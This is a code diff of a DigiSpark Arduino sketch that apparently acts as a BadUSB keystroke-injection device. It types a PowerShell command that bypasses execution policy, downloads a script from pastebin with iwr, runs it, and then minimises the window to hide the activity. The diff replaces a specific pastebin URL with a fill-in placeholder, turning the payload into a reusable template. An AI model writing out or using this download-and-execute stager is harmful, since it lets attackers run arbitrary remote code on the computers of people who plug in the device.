@@ -17,7 +17,7 @@ void setup() {
   DigiKeyboard.delay(1000); //2000
 
   //Fast script
-  DigiKeyboard.println("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;iwr \"https://pastebin.com/raw/bmT8hGnY\" -OutFile f.ps1;.\\f.ps1;exit");
+  DigiKeyboard.println("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;iwr \"<Your pastebin goes here>\" -OutFile f.ps1;.\\f.ps1;exit");
 
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Minimize
   DigiKeyboard.sendKeyStroke(KEY_N);
